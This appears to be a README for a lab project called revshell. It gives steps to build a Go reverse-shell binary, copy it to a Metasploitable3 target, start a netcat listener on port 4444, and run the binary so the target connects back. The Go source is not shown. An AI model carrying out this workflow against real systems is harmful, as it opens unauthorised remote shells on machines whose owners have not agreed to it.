# revshell
Reverse Shell

## Clone this Repo (Kali Linux)

git clone https://github.com/galaxy3-net/revshell.git ~/revshell

## Installing Go Compiler

curl -O https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz

tar xf go1.10.3.linux-amd64.tar.gz

sudo chown -R root:root go

sudo mv go /usr/local/

vi /etc/profile

source ~/.profile

mkdir -p ~/work/revshell

cd ~/work/revshell

vi revshell.go

export GOOS=linux
export GOARCH=amd64

go build revshell.go

scp revshell vagrant@10.55.56.52:revshell

## Startup Target (Kali Linux)

nc -n -t -lp 4444

## Running Revshell (Metasploitable3 Ubuntu)

sudo ./revshell

